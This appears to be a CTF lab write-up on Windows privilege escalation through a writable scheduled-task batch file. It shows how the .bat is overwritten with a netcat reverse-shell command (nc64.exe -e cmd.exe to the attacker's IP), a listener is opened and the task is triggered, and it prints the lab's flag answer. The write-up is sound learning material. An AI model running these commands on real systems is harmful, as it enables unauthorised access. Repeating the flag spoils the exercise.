**TASK 4: Other Quick Wins**

**Make sure to open attackbox or your vm in order to solve this taks....**

Privilege escalation is not always a challenge. 
Some misconfigurations can allow you to obtain higher privileged user access and, in some cases, even administrator access.
It would help if you considered these to belong more to the realm of CTF events rather than scenarios you will encounter during real penetration testing engagements. However, if none of the previously mentioned methods works, you can always go back to these.



**Scheduled Tasks**

In order to get a detail view about any services that you are using you can use the command `schtasks` like this:

     schtasks /query /tn vulntask /fo list /v

**Q. What is the taskusr1 flag?**

For this we will see the schtasks and look out for the option **Task to Run** and **Run As User** which shows the user that will be used to execute the task.

If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, 
resulting in a simple privilege escalation. To check the file permissions on the executable, we use icacls.

As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. 
This means we can modify the .bat file and insert any payload we like. For your convenience, nc64.exe can be found on C:\tools.

      echo c:\tools\nc64.exe -e cmd.exe <yourip> 4444 > C:\tasks\schtask.bat

Now open the listener in your machine 

    nc -lnvp 4444

if it shows error that 4444 is already in use then make sure to changes the port number in both of the above command..

By doing this we made sure the moment the next task is scheduled we will get a reverse shell with taskusr1 privileges. 

As this is a lab thats why we have so much access but in real life the things will be different and we might not be able to trigger the task we will have to wait for task to trigger.

      C:\> schtasks /run /tn vulntask


Now check your machine you will see that you have a reverse shell connection with the user taskusr1


![reverseshell](https://github.com/Anirudh-Saxena/Windows-Privilege-Escalation-WriteUP/assets/73027020/94c378a2-4bed-484e-8f95-b79b8a28d26b)

For flag type the command :

         C:\Users\taskusr1\Desktop\flag.txt


The flag is: `THM{TASK_COMPLETED}`


    
